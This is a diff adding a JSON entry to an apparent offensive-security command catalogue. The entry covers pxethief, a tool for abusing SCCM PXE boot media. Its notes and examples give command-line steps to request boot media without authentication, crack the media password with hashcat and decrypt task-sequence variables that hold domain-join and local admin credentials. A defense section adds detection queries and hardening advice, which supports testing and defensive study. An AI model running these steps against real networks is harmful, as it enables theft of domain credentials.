@@ -1,0 +1,103 @@
+{
+  "id": "sccm-pxe-media-abuse",
+  "name": "pxethief - SCCM PXE Boot Media Abuse",
+  "command": "python pxethief.py 2 <ip>",
+  "description": "SCCM PXE-enabled Distribution Points serve OS-deployment boot media (a password-protected .pxe / variables blob) over TFTP. pxethief requests the PXE media, recovers or cracks the (often weak or absent) media password, and decrypts the task-sequence variables - which routinely contain domain-join credentials, local admin passwords, and other secrets. A single unauthenticated PXE request to a DP can hand an attacker domain credentials.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "SCCM Attacks",
+  "certifications": [
+    "CRTP"
+  ],
+  "primary_cert": "CRTP",
+  "source": "MWR-CyberSec/PXEThief",
+  "tags": [
+    "sccm",
+    "mecm",
+    "pxethief",
+    "pxe",
+    "task-sequence",
+    "credential-access",
+    "tftp"
+  ],
+  "mitre": [
+    "T1552.001",
+    "T1078.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== IDENTIFY PXE-ENABLED DPs ===\n  # Option 1 enumerates reachable PXE/DHCP responders:\n  python pxethief.py 1\n\n=== REQUEST + CRACK PXE MEDIA (unauthenticated) ===\n  # Request media variables from a specific PXE DP and auto-attempt the password:\n  python pxethief.py 2 <ip>\n  # Output includes the encrypted media file and, if cracked, the task-sequence vars\n\n=== CRACK THE MEDIA PASSWORD OFFLINE ===\n  # Extract the hash and feed hashcat (mode 19850 - SCCM PXE):\n  python pxethief.py 5 <pxe_variables_file>\n  hashcat -m 19850 <hash_file> <wordlist>\n\n=== DECRYPT TASK-SEQUENCE VARIABLES ===\n  python pxethief.py 3 <media_variables_file> <password>\n  # Reveals: OSDJoinAccount / OSDJoinPassword (domain-join creds),\n  #          local admin password, collection variables, cert blobs\n\n=== WHY IT WORKS ===\n  - PXE boot is reachable pre-authentication on the network segment.\n  - Media passwords are frequently blank, weak, or reused.\n  - Task-sequence variables store plaintext-recoverable domain-join creds.\n\n=== ALTERNATIVES ===\n  SharpSCCM get secrets        # policy-based secret theft\n  Snaffler / CMLoot            # content-based loot",
+  "examples": [
+    {
+      "label": "Discover PXE responders",
+      "command": "python pxethief.py 1"
+    },
+    {
+      "label": "Request + crack media from a DP",
+      "command": "python pxethief.py 2 <ip>"
+    },
+    {
+      "label": "Crack media password with hashcat",
+      "command": "hashcat -m 19850 <hash_file> <wordlist>"
+    }
+  ],
+  "references": [
+    {
+      "title": "PXEThief",
+      "url": "https://github.com/MWR-CyberSec/PXEThief"
+    },
+    {
+      "title": "Misconfiguration Manager - CRED-3 (PXE)",
+      "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sccm-sccmhunter-recon",
+      "note": "Locate PXE-enabled Distribution Points first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "sccm-cmloot-dp-looting",
+      "note": "Another unauth-adjacent DP credential source.",
+      "rel": "alternative"
+    },
+    {
+      "id": "sccm-site-takeover-relay",
+      "note": "Escalate recovered creds toward site takeover.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "PXE-enabled Distribution Points answer boot requests over TFTP before any authentication, and the media password protecting the boot variables is often blank, weak, or shared. The task-sequence variables carried in the media include domain-join and local-admin credentials in a recoverable form.",
+    "prerequisites": "Network reach to a PXE-enabled DP (same or routed DHCP/PXE segment). No credentials required for the initial request; a weak/blank media password for decryption.",
+    "impact": "Recovery of domain-join credentials, local administrator passwords, and task-sequence secrets from an unauthenticated network position.",
+    "detection": "[MITRE T1552.001] Unexpected PXE/TFTP boot requests from a host that is not a provisioning client; DHCP/PXE responder logs showing requests outside imaging windows; repeated TFTP reads of boot media.",
+    "artifacts": "WDS/PXE and TFTP (UDP 69) logs on the DP; DHCP option-60 PXE requests; Sysmon network events; unusually timed OS-deployment requests.",
+    "splunk_spl": "index=network (dest_port=69 OR transport=udp) uri=\"*.bcd\" OR uri=\"*boot*\"\n| stats count by src_ip, dest_ip\n| where count > 3",
+    "elastic_kql": "network.transport:\"udp\" and destination.port:69 and source.ip:*",
+    "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort == 69 and Protocol == \"Udp\"\n| summarize Count=count() by DeviceName, RemoteIP, bin(TimeGenerated, 1h)\n| where Count > 3",
+    "sigma_rules": "net_sccm_pxe_tftp_media_request_anomaly",
+    "prevention": "Set a strong PXE media password and rotate it; restrict PXE to dedicated imaging VLANs; use the OSDJoinAccount with least privilege; prefer domain-join via a per-image offline-join blob rather than embedded creds; monitor TFTP/PXE requests from non-imaging hosts and disable PXE where unused.",
+    "sources": [
+      "https://github.com/MWR-CyberSec/PXEThief",
+      "https://github.com/subat0mik/Misconfiguration-Manager"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Unexpected PXE/TFTP boot media request to SCCM DP",
+        "logic": "DeviceNetworkEvents\n| where RemotePort == 69 and Protocol == \"Udp\"\n| summarize Count=count() by DeviceName, RemoteIP, bin(TimeGenerated, 1h)\n| where Count > 3",
+        "data_source": "network-flow",
+        "attack": [
+          "T1552.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "low",
+        "false_positives": "Legitimate OS deployment and re-imaging generate PXE/TFTP traffic.",
+        "tuning": "Scope to imaging VLANs and maintenance windows; alert on PXE requests from production subnets or outside imaging windows."
+      }
+    ]
+  }
+}
